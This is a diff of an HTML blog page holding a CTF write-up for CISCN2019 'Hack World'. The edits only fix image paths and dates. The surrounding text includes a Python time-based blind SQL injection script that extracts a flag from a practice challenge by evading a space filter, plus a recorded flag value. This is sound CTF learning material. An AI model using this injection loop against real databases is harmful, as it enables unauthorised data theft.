@@ -87,12 +87,12 @@
 <meta property="og:site_name" content="V&#39;s blog">
 <meta property="og:description" content="The_Seventh_Day_for_Web[CISCN2019 华北赛区 Day2 Web1]Hack WorldAll You Want Is In Table ‘flag’ and the column is ‘flag’ Now, just give the id of passage 直接告诉列名和表名，显然是sql注入了。 发现过滤了and 空格 or /**/，然后没有回显，只有b">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/08/2/The_Seventh_Day_for_Web/1564734204733.png">
-<meta property="og:updated_time" content="2019-08-02T11:35:03.698Z">
+<meta property="og:image" content="http://yoursite.com/2019/08/02/The_Seventh_Day_for_Web/1564734204733.png">
+<meta property="og:updated_time" content="2019-08-09T04:16:42.059Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="The_Seventh_Day_for_Web">
 <meta name="twitter:description" content="The_Seventh_Day_for_Web[CISCN2019 华北赛区 Day2 Web1]Hack WorldAll You Want Is In Table ‘flag’ and the column is ‘flag’ Now, just give the id of passage 直接告诉列名和表名，显然是sql注入了。 发现过滤了and 空格 or /**/，然后没有回显，只有b">
-<meta name="twitter:image" content="http://yoursite.com/2019/08/2/The_Seventh_Day_for_Web/1564734204733.png">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/02/The_Seventh_Day_for_Web/1564734204733.png">
 
 
 
@@ -340,7 +340,7 @@
 <p>拿到了柴哥的exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://web43.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">table=<span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#123;&#125;"</span></span><br><span class="line"><span class="comment">#flag&#123;5yk358dl6me5exxwo4mo2hjs5w0hadz9&#125;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        ss = time.time()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'''ELT(left((select flag from flag),&#123;&#125;)='&#123;&#125;&#123;&#125;',SLEEP(1))'''</span>.format(len(flag)+<span class="number">1</span>,flag, i)</span><br><span class="line">        &#125;</span><br><span class="line">        data[<span class="string">'id'</span>] = data[<span class="string">'id'</span>].replace(<span class="string">" "</span>,<span class="string">"\t"</span>)</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time.time()-ss&gt;=<span class="number">1</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="keyword">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
-<p>表示不知道是不是网络的原因，自己就成功过。于是试着把睡眠时间拉长一点，<img src="/2019/08/2/The_Seventh_Day_for_Web/1564734204733.png" alt="1564734204733"></p>
+<p>表示不知道是不是网络的原因，自己就成功过。于是试着把睡眠时间拉长一点，<img src="/2019/08/02/The_Seventh_Day_for_Web/1564734204733.png" alt="1564734204733"></p>
 <p>唉，，不太行，前对都对了这么多了，还是崩了。</p>
 <h4 id="leaning"><a href="#leaning" class="headerlink" title="leaning"></a>leaning</h4><p>来看看这条sql语句叭。</p>
 <p>ELT(left((select flag from flag),{})=’{}{}’,SLEEP(1))’’’.format(len(flag)+1,flag, i)</p>
@@ -510,7 +510,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
